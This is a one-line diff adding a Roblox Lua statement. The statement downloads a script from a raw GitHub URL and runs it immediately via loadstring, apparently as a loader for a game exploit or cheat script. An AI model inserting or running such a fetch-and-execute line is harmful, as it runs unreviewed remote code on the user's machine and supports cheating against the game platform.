@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/wildsirmonkey/Roblox/main/GGBALLS/plane'))()
